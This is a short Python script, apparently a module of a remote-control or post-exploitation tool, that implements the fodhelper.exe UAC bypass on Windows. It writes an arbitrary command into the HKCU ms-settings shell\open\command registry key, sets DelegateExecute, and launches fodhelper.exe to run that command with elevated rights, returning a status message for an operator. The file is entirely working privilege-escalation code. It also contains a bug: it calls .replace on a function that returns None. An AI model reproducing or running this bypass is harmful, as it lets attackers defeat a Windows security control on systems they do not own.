import ctypes
import winreg
import os

FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin():
  try:
    return ctypes.windll.shell32.IsUserAnAdmin()
  except:
    return False


def create_reg_key(key, value):     
  winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
  registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
  winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
  winreg.CloseKey(registry_key)


def bypass_uac(cmd):
  create_reg_key(DELEGATE_EXEC_REG_KEY, '')
  create_reg_key(None, cmd)


def bypass(path, arguments):
  bypass_uac(f'{path}{arguments}').replace('/', '\\')
  os.system(FOD_HELPER)
  return {'message': 'Attempting to elevate privileges', 'text_mode': 'primary', 'text_extras': {'point': True}}